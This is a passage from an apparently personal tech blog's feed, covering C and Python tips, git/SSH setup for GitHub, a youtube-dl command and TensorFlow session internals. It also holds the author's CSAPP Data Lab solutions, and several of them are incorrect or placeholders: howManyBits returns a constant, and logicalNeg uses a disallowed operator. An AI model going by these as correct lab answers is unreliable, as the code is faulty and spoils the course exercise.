      
      
        &lt;p&gt;static在C语言中是非常重要的关键字，但是它很容易被理解错误。因为static可以出现在多个地方，有着不同的含义：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;static 全局变量&lt;/li&gt;
&lt;li&gt;static 局部变量&lt;/li&gt;
&lt;li&gt;static 函数&lt;/li&gt;
&lt;/ul&gt;
&lt;
      
    
    </summary>
    
      <category term="C" scheme="http://larryim.cc/categories/C/"/>
    
    
      <category term="C" scheme="http://larryim.cc/tags/C/"/>
    
      <category term="static" scheme="http://larryim.cc/tags/static/"/>
    
  </entry>
  
  <entry>
    <title>Records</title>
    <link href="http://larryim.cc/2017/12/30/Python-Records/"/>
    <id>http://larryim.cc/2017/12/30/Python-Records/</id>
    <published>2017-12-29T16:00:00.000Z</published>
    <updated>2018-09-24T17:11:44.372Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Get-key-name-from-Python-KeyError-exception"><a href="#Get-key-name-from-Python-KeyError-exception" class="headerlink" title="Get key name from Python KeyError exception"></a>Get key name from Python KeyError exception</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    x2 = myDict[<span class="string">'key2'</span>]</span><br><span class="line"><span class="keyword">except</span> KeyError <span class="keyword">as</span> e:    </span><br><span class="line">    <span class="keyword">print</span> e.args[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><h4 id="How-to-print-without-newline-or-space"><a href="#How-to-print-without-newline-or-space" class="headerlink" title="How to print without newline or space?"></a>How to print without newline or space?</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">'.'</span>, end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;Get-key-name-from-Python-KeyError-exception&quot;&gt;&lt;a href=&quot;#Get-key-name-from-Python-KeyError-exception&quot; class=&quot;headerlink&quot; title=&quot;Get ke
      
    
    </summary>
    
      <category term="Python" scheme="http://larryim.cc/categories/Python/"/>
    
    
  </entry>
  
  <entry>
    <title>git</title>
    <link href="http://larryim.cc/2017/12/30/awesome-Install-git/"/>
    <id>http://larryim.cc/2017/12/30/awesome-Install-git/</id>
    <published>2017-12-29T16:00:00.000Z</published>
    <updated>2018-01-28T07:35:48.677Z</updated>
    
    <content type="html"><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p><code>git</code>在mac上已经默认安装了，使用之前只需要简单的配置即可。</p><h3 id="设置Git的user-name和email"><a href="#设置Git的user-name和email" class="headerlink" title="设置Git的user name和email"></a>设置Git的user name和email</h3><p>把下面的<code>username</code>和<code>email</code>替换成您的<code>Github</code>的用户名和地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global user.name &quot;username&quot;</span><br><span class="line">$ git config --global user.email &quot;email&quot;</span><br></pre></td></tr></table></figure><h3 id="生成密钥"><a href="#生成密钥" class="headerlink" title="生成密钥"></a>生成密钥</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-keygen -t rsa -C &quot;email&quot;</span><br></pre></td></tr></table></figure><p>默认连续3个回车， 最后得到了两个文件：<code>～/.ssh/id_rsa</code>和<code>~/.ssh/id_rsa.pub</code>。注意这两个文件的保存地址(会输出在终端上，等下要用)。</p><p>其中公钥保存在<code>id_rsa.pub</code>内。</p><h3 id="添加密钥到ssh-agent"><a href="#添加密钥到ssh-agent" class="headerlink" title="添加密钥到ssh-agent"></a>添加密钥到ssh-agent</h3><p><code>ssh-agent</code>是一种控制用来保存公钥身份验证所使用的私钥的程序，其实<code>ssh-agent</code>就是一个密钥管理器，运行<code>ssh-agent</code>以后，使用<code>ssh-add</code>将私钥<code>id_rsa</code>交给<code>ssh-agent</code>保管，其他程序需要身份验证的时候可以将验证申请交给<code>ssh-agent</code>来完成整个认证过程。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ eval &quot;$(ssh-agent -s)&quot;</span><br></pre></td></tr></table></figure><p>添加生成的 <code>SSH key</code> 到 <code>ssh-agent</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-add ~/.ssh/id_rsa</span><br></pre></td></tr></table></figure><h3 id="登陆Github-添加ssh"><a href="#登陆Github-添加ssh" class="headerlink" title="登陆Github, 添加ssh"></a>登陆<code>Github</code>, 添加<code>ssh</code></h3><p>复制<code>id_rsa.pub</code>文件里面的内容。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">more .ssh/id_rsa.pub</span><br></pre></td></tr></table></figure><p>打开<a href="https://github.com"><code>GitHub</code></a>,依次选择<code>settings</code>-<code>SSH and GPG keys</code>-<code>New SSH key</code>。进入到如下界面，输入任意<code>Title</code>，在<code>Key</code>输入框内粘贴上<code>id_rsa.pub</code>文件里面的内容。</p><p><img src="http://or9a8nskt.bkt.clouddn.com/add_ssh_key.png" alt="add_ssh_key"></p><p>测试一下是否可以连接：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><p>测试成功后，在github页面的SSH keys上的钥匙符号会显示为绿色：</p><p><img src="http://or9a8nskt.bkt.clouddn.com/gree.png" alt="gree"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; title=&quot;安装&quot;&gt;&lt;/a&gt;安装&lt;/h2&gt;&lt;p&gt;&lt;code&gt;git&lt;/code&gt;在mac上已经默认安装了，使用之前只需要简单的配置即可。&lt;/p&gt;
&lt;h3 id=&quot;设置Git的user-na
      
    
    </summary>
    
      <category term="awesome Install" scheme="http://larryim.cc/categories/awesome-Install/"/>
    
    
      <category term="Git" scheme="http://larryim.cc/tags/Git/"/>
    
  </entry>
  
  <entry>
    <title>Youtube</title>
    <link href="http://larryim.cc/2017/12/30/awesome-Install-Youtube/"/>
    <id>http://larryim.cc/2017/12/30/awesome-Install-Youtube/</id>
    <published>2017-12-29T16:00:00.000Z</published>
    <updated>2018-05-27T05:05:07.986Z</updated>
    
    <content type="html"><![CDATA[<p><code>Youtube-dl</code>可以下载Youtube网页的视频，功能很强大。但<code>Youtube-dl</code>还有个缺点，就是下载时单线程。简直就是龟速，下载视频往往还比较大，单线程是不可能使用的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">youtube-dl    https://www.youtube.com/playlist\?list\=PLrmLmBdmIlpslxZUHHWmfOzNn6cA7jvyh   --external-downloader aria2c --external-downloader-args <span class="string">"-x 16  -k 1M"</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;code&gt;Youtube-dl&lt;/code&gt;可以下载Youtube网页的视频，功能很强大。但&lt;code&gt;Youtube-dl&lt;/code&gt;还有个缺点，就是下载时单线程。简直就是龟速，下载视频往往还比较大，单线程是不可能使用的。&lt;/p&gt;
&lt;figure class=&quot;hig
      
    
    </summary>
    
      <category term="awesome Install" scheme="http://larryim.cc/categories/awesome-Install/"/>
    
    
      <category term="Youtube" scheme="http://larryim.cc/tags/Youtube/"/>
    
  </entry>
  
  <entry>
    <title>Lab1 Data Lab</title>
    <link href="http://larryim.cc/2017/12/30/CSAPP-Lab-Data-Lab/"/>
    <id>http://larryim.cc/2017/12/30/CSAPP-Lab-Data-Lab/</id>
    <published>2017-12-29T16:00:00.000Z</published>
    <updated>2018-10-24T08:35:48.175Z</updated>
    
    <content type="html"><![CDATA[<h4 id="位操作"><a href="#位操作" class="headerlink" title="位操作"></a>位操作</h4><p>bitXor - x^y using only ~ and &amp; </p><ul><li>Example: bitXor(4, 5) = 1</li><li>Legal ops: ~ &amp;</li><li>Max ops: 14</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitXor</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ~(x&amp;y)&amp;(~((~x)&amp;(~y)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>allOddBits - return 1 if all odd-numbered bits in word set to 1</p><ul><li>Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1</li><li>Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</li><li>Max ops: 12</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">allOddBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v = <span class="number">0xAA</span>;</span><br><span class="line">  v = v | (v &lt;&lt; <span class="number">8</span>);</span><br><span class="line">  v = v | (v &lt;&lt; <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">return</span> !(((x &amp; v) | (~v)) +<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters ‘0’ to ‘9’)</p><ul><li>Example: isAsciiDigit(0x35) = 1. isAsciiDigit(0x3a) = 0. isAsciiDigit(0x05) = 0.</li><li>Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</li><li>Max ops: 15</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isAsciiDigit</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span>  (!(~(x &gt;&gt; <span class="number">8</span>)+<span class="number">1</span>))&amp;(!((x<span class="number">-0x30</span>)&gt;&gt;<span class="number">31</span>))&amp;(!(((x<span class="number">-0x3a</span>)&gt;&gt;<span class="number">31</span>)+<span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>conditional - same as x ? y : z </p><ul><li>Example: conditional(2,4,5) = 4</li><li>Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</li><li>Max ops: 16</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// repeat</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">conditional</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z)</span> </span>&#123;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     *if x!=0,mask=0x00000000, y&amp;~mask=y and z&amp;mask=0</span></span><br><span class="line"><span class="comment">     *if x==0,mask=0xffffffff, y&amp;~mask = y&amp;0 =0; z&amp;mask=z</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">int</span> mask= ~!x+<span class="number">1</span>; </span><br><span class="line">  <span class="keyword">return</span> (y &amp; ~mask)|(z &amp; mask);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>logicalNeg - implement the ! operator, using all of the legal operators except !</p><ul><li>Examples: logicalNeg(3) = 0, logicalNeg(0) = 1</li><li>Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</li><li>Max ops: 12</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">logicalNeg</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> !(~(x<span class="number">-1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="补码运算"><a href="#补码运算" class="headerlink" title="补码运算"></a>补码运算</h4><p>tmin - return minimum two’s complement integer </p><ul><li>Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</li><li>Max ops: 4</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tmin</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>&lt;&lt;<span class="number">31</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>isTmax - returns 1 if x is the maximum, two’s complement number, and 0 otherwise </p><ul><li>Legal ops: ! ~ &amp; ^ | +</li><li>Max ops: 10</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isTmax</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> !((~x) ^ (x + <span class="number">1</span>)) &amp; !!(~x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>negate - return -x </p><ul><li>Example: negate(1) = -1.</li><li>Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</li><li>Max ops: 5</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">negate</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ~(x<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>isLessOrEqual - if x &lt;= y  then return 1, else return 0 </p><ul><li>Example: isLessOrEqual(4,5) = 1.</li><li>Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</li><li>Max ops: 24</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isLessOrEqual</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (!(((x-y)&gt;&gt;<span class="number">31</span>)+<span class="number">1</span>)) || (!(x-y));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>howManyBits - return the minimum number of bits required to represent x in two’s complement</p><ul><li>Examples: howManyBits(12) = 5, howManyBits(298) = 10, howManyBits(-5) = 4, howManyBits(0)  = 1, howManyBits(-1) = 1, howManyBits(0x80000000) = 32</li><li>Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</li><li>Max ops: 90</li><li>Rating: 4</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">howManyBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="浮点数运算"><a href="#浮点数运算" class="headerlink" title="浮点数运算"></a>浮点数运算</h4><p>float_twice - Return bit-level equivalent of expression 2*f for<br>floating point argument f.</p><ul><li>Both the argument and result are passed as unsigned int’s, but they are to be interpreted as the bit-level representation of single-precision floating point values.</li><li>When argument is NaN, return argument</li><li>Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while<br>Max ops: 30</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">float_twice</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> sign = uf &amp; <span class="number">0x80000000</span>;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="built_in">exp</span> = uf &amp; <span class="number">0x7f800000</span>;</span><br><span class="line">  <span class="keyword">unsigned</span> frac = uf &amp; <span class="number">0x007FFFFF</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">exp</span>==<span class="number">0x7F800000</span>) <span class="comment">// when argument is NaN, return argument</span></span><br><span class="line">      <span class="keyword">return</span> uf;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">exp</span> == <span class="number">0x0</span>) <span class="comment">// 无规格化的情况</span></span><br><span class="line">      <span class="keyword">return</span> sign | (frac &lt;&lt; <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">exp</span> == <span class="number">0x7f000000</span>)<span class="comment">// 会变成无穷大</span></span><br><span class="line">      frac = <span class="number">0x0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> sign|(<span class="built_in">exp</span>+<span class="number">0x800000</span>)|frac;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>float_i2f - Return bit-level equivalent of expression (float) x<br>Result is returned as unsigned int, but</p><ul><li>it is to be interpreted as the bit-level representation of a single-precision floating point values.</li><li>Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</li><li>Max ops: 30</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">unsigned</span> <span class="title">float_i2f</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//Rounding is important!  </span></span><br><span class="line">    <span class="keyword">unsigned</span> sign=<span class="number">0</span>,shiftleft=<span class="number">0</span>,flag=<span class="number">0</span>,tmp;  </span><br><span class="line">    <span class="keyword">unsigned</span> absx=x;  </span><br><span class="line">    <span class="keyword">if</span>( x==<span class="number">0</span> ) <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">    <span class="keyword">if</span>( x&lt;<span class="number">0</span> )&#123;  </span><br><span class="line">     sign=<span class="number">0x80000000</span>;  </span><br><span class="line">     absx=-x;  </span><br><span class="line">   &#125;  </span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>)&#123;<span class="comment">//Shift until the highest bit equal to 1 in order to normalize the floating-point number  </span></span><br><span class="line">   tmp=absx;  </span><br><span class="line">   absx&lt;&lt;=<span class="number">1</span>;  </span><br><span class="line">   shiftleft++;  </span><br><span class="line">   <span class="keyword">if</span>( tmp&amp;<span class="number">0x80000000</span> ) <span class="keyword">break</span>;  </span><br><span class="line"> &#125;  </span><br><span class="line"></span><br><span class="line"> <span class="comment">//round to even</span></span><br><span class="line">  <span class="keyword">if</span>( (absx &amp; <span class="number">0x01ff</span>) &gt; <span class="number">0x0100</span> ) flag=<span class="number">1</span>;<span class="comment">//向上舍入</span></span><br><span class="line">  <span class="keyword">if</span>( (absx &amp; <span class="number">0x03ff</span>) == <span class="number">0x0300</span> ) flag=<span class="number">1</span>;<span class="comment">//中间值，向偶数舍入</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> sign+(absx&gt;&gt;<span class="number">9</span>)+((<span class="number">159</span>-shiftleft)&lt;&lt;<span class="number">23</span>)+flag;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>float_f2i - Return bit-level equivalent of expression (int) f<br>for floating point argument f.</p><ul><li>Argument is passed as unsigned int, but it is to be interpreted as the bit-level representation of a single-precision floating point value.</li><li>Anything out of range (including NaN and infinity) should return 0x80000000u.</li><li>Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</li><li>Max ops: 30</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">float_f2i</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> sign = (uf&gt;&gt;<span class="number">31</span>)==<span class="number">0</span> ? <span class="number">1</span>: <span class="number">-1</span>; <span class="comment">//最高位</span></span><br><span class="line">  <span class="keyword">int</span> <span class="built_in">exp</span>  = uf&amp;<span class="number">0x7f800000</span>;  <span class="comment">//中间8位</span></span><br><span class="line">  <span class="keyword">unsigned</span> frac = uf&amp;<span class="number">0x007FFFFF</span>; <span class="comment">//最低23位</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//特殊情况NaN, inf</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">exp</span>==<span class="number">0x7f800000</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x80000000</span>u;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//特殊情况：0</span></span><br><span class="line">  <span class="keyword">if</span> (uf==<span class="number">0x800000</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//非规格化</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">exp</span>==<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">exp</span> = <span class="number">1</span><span class="number">-127</span>; <span class="comment">//1-bias</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  <span class="comment">//规格化</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">exp</span> = (<span class="built_in">exp</span>&gt;&gt;<span class="number">23</span>)<span class="number">-127</span>;<span class="comment">// exp-bias;</span></span><br><span class="line">    frac = <span class="number">1</span>+frac; <span class="comment">// frac+=1;</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果小于0.5, 那么应该等于0</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">exp</span> &lt; <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> sign * (frac &lt;&lt; <span class="built_in">exp</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;位操作&quot;&gt;&lt;a href=&quot;#位操作&quot; class=&quot;headerlink&quot; title=&quot;位操作&quot;&gt;&lt;/a&gt;位操作&lt;/h4&gt;&lt;p&gt;bitXor - x^y using only ~ and &amp;amp; &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Example: bitXor(
      
    
    </summary>
    
      <category term="CSAPP Lab" scheme="http://larryim.cc/categories/CSAPP-Lab/"/>
    
    
      <category term="CSAPP" scheme="http://larryim.cc/tags/CSAPP/"/>
    
  </entry>
  
  <entry>
    <title>TF会话生命周期</title>
    <link href="http://larryim.cc/2017/12/30/TensorFlow-TF%E4%BC%9A%E8%AF%9D%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/"/>
    <id>http://larryim.cc/2017/12/30/TensorFlow-TF会话生命周期/</id>
    <published>2017-12-29T16:00:00.000Z</published>
    <updated>2018-01-28T07:12:58.405Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://www.uml.org.cn/zjjs/201704123.asp">转自</a></p><p>TensorFlow的系统结构以C API为界，将整个系统分为「前端」和「后端」两个子系统：</p><p>前端系统：提供编程模型，负责构造计算图；</p><p>后端系统：提供运行时环境，负责执行计算图。</p><p><img src="http://or9a8nskt.bkt.clouddn.com/15148941239904.png" alt="系统架构"></p><p>前端系统主要扮演Client的角色，主要负责计算图的构造，并管理Session生命周期过程。</p><p>前端系统是一个支持多语言的编程环境，并提供统一的编程模型支撑用户构造计算图。Client通过Session，连接TensorFlow后端的「运行时」，启动计算图的执行过程。</p><p>后端系统是TensorFlow的运行时系统，主要负责计算图的执行过程，包括计算图的剪枝，设备分配，子图计算等过程。</p><p>本文首先以Session创建为例，揭示前端Python与后端C/C++系统实现的通道，阐述TensorFlow多语言编程的奥秘。随后，以Python前端，C API桥梁，C++后端为生命线，阐述Session的生命周期过程。</p><h1 id="Swig-幕后英雄"><a href="#Swig-幕后英雄" class="headerlink" title="Swig: 幕后英雄"></a>Swig: 幕后英雄</h1><p>前端多语言编程环境与后端C/C++实现系统的通道归功于Swig的包装器。TensorFlow使用Bazel的构建工具，在编译之前启动Swig的代码生成过程，通过<code>tf_session.i</code>自动生成了两个适配(Wrapper)文件：</p><ul><li><p>pywrap_tensorflow.py: 负责对接上层Python调用；</p></li><li><p>pywrap_tensorflow.cpp: 负责对接下层C实现。</p></li></ul><p>此外，<code>pywrap_tensorflow.py</code>模块首次被加载时，自动地加载<code>_pywrap_tensorflow.so</code>的动态链接库。从而实现了<code>pywrap_tensorflow.py</code>到<code>pywrap_tensorflow.cpp</code>的函数调用关系。</p><p>在<code>pywrap_tensorflow.cpp</code>的实现中，静态注册了一个函数符号表。在运行时，按照Python的函数名称，匹配找到对应的C函数实现，最终转调到<code>c_api.c</code>的具体实现。</p><p><img src="http://or9a8nskt.bkt.clouddn.com/15148941860360.png" alt="Swig代码生成器"></p><h1 id="编程接口：Python"><a href="#编程接口：Python" class="headerlink" title="编程接口：Python"></a>编程接口：Python</h1><p>当Client要启动计算图的执行过程时，先创建了一个Session实例，进而调用父类BaseSession的构造函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># tensorflow/python/client/session.py</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Session</span><span class="params">(BaseSession)</span>:</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, target=<span class="string">''</span>, graph=None, config=None)</span>:</span></span><br><span class="line">    super(Session, self).__init__(target, graph, config=config)</span><br><span class="line">    <span class="comment"># ignoring others</span></span><br></pre></td></tr></table></figure><p>在BaseSession的构造函数中，将调用<code>pywrap_tensorflow</code>模块中的函数。其中，<code>pywrap_tensorflow</code>模块自动由Swig生成。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment"># tensorflow/python/client/session.py</span></span><br><span class="line"><span class="keyword">from</span> tensorflow.python <span class="keyword">import</span> pywrap_tensorflow <span class="keyword">as</span> tf_session</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaseSession</span><span class="params">(SessionInterface)</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, target=<span class="string">''</span>, graph=None, config=None)</span>:</span></span><br><span class="line">    self._session = <span class="keyword">None</span></span><br><span class="line">    opts = tf_session.TF_NewSessionOptions(target=self._target, config=config)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> errors.raise_exception_on_not_ok_status() <span class="keyword">as</span> status:</span><br><span class="line">            self._session = tf_session.TF_NewDeprecatedSession(opts, status)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        tf_session.TF_DeleteSessionOptions(opts)</span><br><span class="line"><span class="comment"># 